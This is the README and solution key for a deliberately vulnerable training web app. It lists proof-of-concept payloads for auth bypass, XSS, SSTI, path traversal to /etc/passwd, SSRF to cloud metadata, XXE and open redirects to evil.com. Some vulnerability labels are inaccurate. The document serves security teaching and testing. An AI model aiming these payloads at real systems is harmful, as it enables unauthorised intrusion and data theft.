
# 🍔 DineHub – Vulnerable Food Ordering Platform

* **Author:** Rayan Al-AlAssiri
* **Difficulty:** Medium
* **Created:** 2025-09-30

---

## Synopsis

**DineHub** is a deliberately vulnerable online food ordering platform designed to simulate real-world web vulnerabilities with realistic protections and bypass requirements.  
The platform allows users to register, browse restaurants, place orders, leave reviews, and manage payments. Each vulnerability is intentionally implemented with partial security controls, requiring bypass techniques such as encoding tricks, payload manipulation, and chaining to exploit successfully.

The application mimics a production-grade SaaS product and supports manual penetration testing, vulnerability research, and automated scanning. Attackers must exploit vulnerabilities in a realistic multi-step chain — starting with authentication bypass and culminating in internal network access.

---

## Quick Solution

> **Purpose:** A compact, human-readable manifest for fast validation.

| # | Vulnerability       | Affected Path                                | PoC                                      |
|---|---------------------|----------------------------------------------|------------------------------------------|
| 1 | SQLi (Auth Bypass)  | *POST* `/auth/login` (JSON body)              | `{ "username": {"$ne": null}, "password": {"$ne": null} }` |
| 2 | SQLi (Data Dump)    | *GET* `/restaurants?filter=`                  | `filter=1 OR 2>1`                        |
| 3 | Reflected XSS       | *GET* `/search` (q parameter)                 | `/search?q=<math href=javascript:alert(1)>` |
| 4 | Stored XSS          | *POST* `/review/add`                          | `<iframe srcdoc="<script>fetch('/cookie')</script>"></iframe>` |
| 5 | SSTI (Template Eval)| *POST* `/admin/announcement`                 | `{{ ''.join(['__cla','ss__']) }}`       |
| 6 | SSTI (RCE)          | *POST* `/admin/offer`                        | `{{ (7).__pow__(2) }}`                   |
| 7 | IDOR (View Order)   | *GET* `/order?id=4a7d1ed414474e4033ac29ccb8653d9b` | Access another user's order data |
| 8 | IDOR (Delete Order) | *POST* `/order/delete`                        | `orderId=00000000-0000-0000-0000-000000000002` |
| 9 | Path Traversal      | *GET* `/receipt/download?file=`               | `file=..%252F..%252F..%252Fetc%252Fpasswd` |
| 10 | Path Traversal (Source Leak) | *GET* `/admin/logs?path=`         | `path=....//....//etc//passwd`          |
| 11 | Sensitive Data Exposure | *GET* `/api/debug`                      | `GET /api/debug?invoice=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` |
| 12 | Sensitive Data Exposure | *GET* `/admin/config`                  | Retrieve exposed API key from config    |
| 13 | SSRF (Localhost)   | *GET* `/fetch/logo?url=`                      | `url=http://0x7f000001:8080`             |
| 14 | SSRF (Metadata)    | *GET* `/admin/fetch_report?url=`             | `url=http://2130706433/latest/meta-data/` |
| 15 | XXE (Local File)   | *POST* `/import/xml`                         | Malicious XML entity read local files   |
| 16 | XXE (Chained Entity)| *POST* `/admin/import`                      | Internal entity chaining to exfiltrate data |
| 17 | Open Redirect      | *GET* `/redirect?next=`                       | `/redirect?next=%2F%2Fevil.com`         |
| 18 | Open Redirect (Admin) | *GET* `/admin/redirect?to=`              | `/admin/redirect?to=https:evil.com`     |
| 19 | Vulnerable Component | Flask <=0.11                              | Trigger known RCE vulnerability         |
| 20 | Vulnerable Component | Requests <=2.18.0                         | SSRF via HTTP request handling          |
| 21 | DOM-Based XSS       | *GET* `/feedback/preview` (hash parameter)  | `#/feedback=<img src=x onerror=alert(1)>` |

---

## Vulnerabilities (Detailed)

### 1. SQL Injection – Authentication Bypass (Advanced)
**Summary:** The login API uses partial parameterized queries, but still concatenates user input from the JSON body. This can be bypassed by using a JSON-style payload to trick the backend logic.  
**Steps to Reproduce:**
1. Send a POST request to `/auth/login` with the following JSON body:
```json
{ "username": {"$ne": null}, "password": {"$ne": null} }
```
2. Gain authenticated session without valid credentials.
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

### 21. DOM-Based XSS – Feedback Preview
**Summary:** The feedback preview page reads the `location.hash` value and renders it directly into the DOM using `innerHTML`, making it vulnerable to DOM-based XSS.  
**Steps to Reproduce:**
1. Visit `/feedback/preview#/feedback=<img src=x onerror=alert(1)>`
2. Observe JavaScript execution in the victim’s browser
**PoC screenshot or unlisted video URL:**  
> **Note:** SOON WILL BE PRESENTED

---

## Build / Run Instructions

Provide reproducible steps to run the app locally, and mention any inputs/commands required:

```bash
# run the build-docker.sh file
./build-docker.sh
```
